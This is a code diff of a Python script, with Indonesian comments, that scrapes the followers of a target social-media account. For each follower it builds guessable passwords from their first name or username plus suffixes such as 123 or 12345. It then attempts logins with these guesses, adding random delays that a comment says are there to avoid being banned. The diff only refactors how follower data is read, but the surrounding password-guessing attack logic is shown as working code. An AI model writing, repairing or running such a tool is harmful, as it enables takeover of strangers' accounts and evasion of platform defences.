@@ -63,12 +63,14 @@ def main():
         return
 
     print(Fore.CYAN + f"⏳ Mengambil followers dari @{target_user}...")
-    followers = scrape_followers(cl, target_user)  # ✅ Perbaikan di sini
+    followers = scrape_followers(cl, target_user)
     print(Fore.GREEN + f"[✓] Ditemukan {len(followers)} followers")
 
     hash_db = load_hash_db()
 
-    for username, full_name in followers.items():
+    for follower in followers:
+        username = follower.get("username", "")
+        full_name = follower.get("full_name", "")
         name_parts = full_name.split(" ")
         base = name_parts[0] if name_parts and name_parts[0] else username
         passwords = [base + str(i) for i in [123, 1234, 12345, 321, ""]]
@@ -92,7 +94,7 @@ def main():
                 break
             else:
                 print(Fore.RED + f"❌ Invalid")
-                time.sleep(random.uniform(1.5, 2.5))  # Delay aman biar tidak cepat banned
+                time.sleep(random.uniform(1.5, 2.5))  # Delay aman
 
 if __name__ == "__main__":
     main()
